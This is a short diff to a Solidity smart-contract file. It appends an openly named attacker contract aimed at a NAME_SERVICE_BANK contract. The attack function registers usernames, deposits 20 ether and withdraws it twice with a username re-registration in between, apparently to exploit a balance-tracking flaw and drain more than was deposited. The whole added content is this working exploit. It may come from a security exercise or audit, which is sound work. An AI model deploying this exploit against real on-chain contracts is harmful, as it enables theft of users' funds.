@@ -119,3 +119,22 @@ contract NAME_SERVICE_BANK {
         _balanceOf[cacheUsername] += msg.value;
     }
 }
+
+contract NameServiceAttacker {
+    NAME_SERVICE_BANK bank;
+
+    constructor(address bankAdd) {
+        bank = NAME_SERVICE_BANK(payable(bankAdd));
+    }
+
+    function attack(uint256[2] memory _usernameSubscriptionDuration) external payable {
+        NAME_SERVICE_BANK(bank).setUsername{value: 1 ether}("random", 0, _usernameSubscriptionDuration);
+        NAME_SERVICE_BANK(bank).deposit{value: 20 ether}();
+        NAME_SERVICE_BANK(bank).setUsername{value: 1 ether}("random2", 0, _usernameSubscriptionDuration);
+        NAME_SERVICE_BANK(bank).withdraw(20 ether);
+        NAME_SERVICE_BANK(bank).setUsername{value: 1 ether}("random", 0, _usernameSubscriptionDuration);
+        NAME_SERVICE_BANK(bank).withdraw(20 ether);
+    }
+
+    fallback() external payable {}
+}
